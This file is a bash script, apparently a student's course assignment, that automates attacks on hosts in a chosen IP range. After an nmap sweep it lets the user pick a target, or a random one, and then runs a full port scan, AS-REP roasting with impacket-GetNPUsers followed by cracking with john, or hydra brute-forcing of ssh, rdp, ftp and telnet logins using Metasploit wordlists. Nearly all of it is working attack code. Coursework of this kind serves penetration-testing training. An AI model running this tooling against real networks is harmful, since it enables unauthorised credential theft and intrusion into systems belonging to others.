#!/bin/bash
#Name: Evgeni Genchev
#Student code: s5
#Class code: TCB-2511
#Lecture's name: Ivan Blagoev
#
#
IFS=$'\n'
PROTOCOLS="ssh rdp ftp telnet"

#Asks for an ip or range and then validates if it is correct
function VLDT_IP(){
	read -p "[?] Choose ip or range: " IPS
	resolved=$(nmap -sL -n "$IPS" 2>&1)
	if [ -n "$(echo "$resolved" | grep "Failed to resolve")" ]; 
	then
		echo "[-] Wrong ip or range"
	else
		resolved=$(echo "$resolved" | grep "scan report for" | awk '{print $5}')
	fi
}

#Asks for a password file for BF, if empty default one is used, checks if the path exists otherwise it stopes
function VLDT_PASS(){
	read -p "[?] Choose password list [none]: " PASS
	if [ -z "$PASS" ]
	then
		PASS="/usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt"
	else
		if [ ! -f "$PASS" ];
		then
			echo "[-] Password list does not exists..."
			exit 0
		fi
	fi
	
}
#Asks for a username file for BF, if empty default one is used, checks if the path exists otherwise it stopes
function VLDT_USR(){
	read -p "[?] Choose user list [none]: " USR
	if [ -z "$USR" ]
	then
		USR="/usr/share/metasploit-framework/data/wordlists/default_users_for_services_unhash.txt"
	else
		if [ ! -f "$USR" ]
		then
			echo "[-] User list does not exists..."
			exit 0
		fi
	fi
}
#The function does bf with hydra to all ports for a protocol that has been given
#Parameters: $1: Open services; $2: Protocol; $3: IP
function SVC_BF(){
	service=$(echo "$1" | grep -w "$2" | awk '{print $1}')
	for i in $service
	do
		port=$(echo "$i" | awk -F '/' '{print $1}')
		echo "[*] Brute-forcing $2 port: $port ip: $3"
		hdr_data=$(hydra -L "$USR" -P "$PASS" -s "$port" "$3" "$2" 2>&1 | grep "login:")
		if [ -n "$hdr_data" ]
		then
			echo "[*] Weak $2 credentials found at $3:"
			echo "$hdr_data"
		else
			echo "[*] No weak $2 credentials found at $3"
		fi
		
	done
}
#The main bf functions that checks for ports for bf from the PROTOCOLS const
#Parameters: $1: Services; $2: IP
function BF_MAIN(){
	opened=$(echo "$1" | grep -w "open")
	if [ -n "$opened" ]
	then
		svcs=$(echo "$opened" | awk '{print $1,$3}' | grep "tcp")
		for i in $PROTOCOLS
		do
			if [ -n "$(echo "$svcs" | grep "$i")" ]
			then
				SVC_BF "$svcs" "$i" "$2"
			fi
		done
	else
		echo "[*] No open ports at $2"
	fi
}

# Cracks hashes found during the AS-REP
function CRACK(){
	VLDT_PASS
	passwords=$(john /tmp/hashes --wordlist=$PASS 2> /dev/null)
	echo "$passwords"
}

# Executes the AS-REP attack
#Parameters: $1: IP
function ASREP(){
	domain=$(sudo nmap $1 -p 389 --script ldap-rootdse -Pn -T5 | grep dnsHostName | awk '{print $3}' | cut -d. -f2-)
	VLDT_USR
	res=$(impacket-GetNPUsers "$domain/" -usersfile=$USR -dc-ip=$1 -format=john 2>/dev/null | grep -v "Kerberos SessionError\|Impacket")
	echo "$res"
	hashes=$(echo "$res" | grep -v "doesn't have UF_DONT_REQUIRE_PREAUTH set")
	if [ -n "$(echo "$hashes" | grep "@")" ]
	then
		echo
		echo "[+] Passwords found!"
		echo
		echo "$hashes" > /tmp/hashes
		read -p "[?] Do you want to crack? [Y/n]: " OPT
		case $OPT in
			y|Y)
				CRACK
				;;
			n|N)
				;;
			*)
				if [[ -z $OPT ]]
				then
					CRACK
				else
					echo "[-] Wrong input"
				fi
				;;
		esac
	else
		echo "No password found from the ASREP attack"
	fi
}


VLDT_IP
curr_ip=$(hostname -I | awk '{print $1}')
echo "[*] Scanning $IPS..."
hosts=$(sudo nmap $IPS -PU -sn)
index=1
targets=""
dir="/var/log/checker/"
sudo mkdir -p $dir
for i in $(echo "$hosts" | grep "Nmap scan report" | grep -v "$curr_ip")
	do
		targets+="$index) $(echo "$i" | awk '{$1=$2=$3=$4=""; print $0}')"$'\n'
		((index++))
	done
while true; do
    echo
    echo "========== Select Target =========="
    echo "$targets"
    echo "0) Random target"
    echo "-1) Exit"
    echo "==================================="
    read -rp "Select an option: " OPT
	if [[ "$OPT" == "-1" ]]; then
        echo "Exiting..."
        exit 0
    fi
    if [[ "$OPT" == "0" ]]; then
        echo "[*] Choosing random target..."
        OPT=$((RANDOM % (index-1) + 1))
    fi
    if [[ -n "$(echo "$targets" | grep "^${OPT})")" ]]; then
        target=$(echo $(echo "$targets" | grep "^${OPT})") | grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}")
        sec=$(date +%s)
        log="$dir/$sec.log"
		echo "[*] Target: $target" | sudo tee -a $log
		while true; do
			echo
			echo "========== Select Attack Vector =========="
			echo "1) Host scan       - Discover open ports and running services"
			echo "2) AS-REP          - Check for accounts vulnerable to AS-REP roasting"
			echo "3) Brute-force     - Attempt authentication using a wordlist"
			echo "0) Random attack"
			echo "-1) Exit"
			echo "==================================="
			read -rp "Select an option: " option
			echo "Date: $(date -d @$sec)" >> $log
			if [[ "$option" == "0"  ]]
			then
				echo "[*] Choosing random attack..."
				option=$((RANDOM % 3 + 1))
			fi
			case "$option" in
				1)
					echo "[*] Attack: Host scan" | sudo tee -a $log
					sudo nmap "$target" -p- -sS -sV -sC --reason | sudo tee -a $log
					break
					;;
				2)
					echo "[*] Attack: AS-REP" | sudo tee -a $log
					ASREP "$target" | sudo tee -a $log
					break
					;;
				3)
					echo "[*] Attack: Brute-force" | sudo tee -a $log
					report=$(sudo nmap "$target" -p- -sS -T4)
					VLDT_USR
					VLDT_PASS
					BF_MAIN "$report" "$target" | sudo tee -a $log
					break
					;;
				-1)
					echo "[*] Exiting..."
					exit 0
					;;
				*)
					echo "[-] Invalid option. Please try again."
					;;
			esac
		done
    else
        echo "[-] Invalid option. Please try again."
    fi
done

wait
exit 0
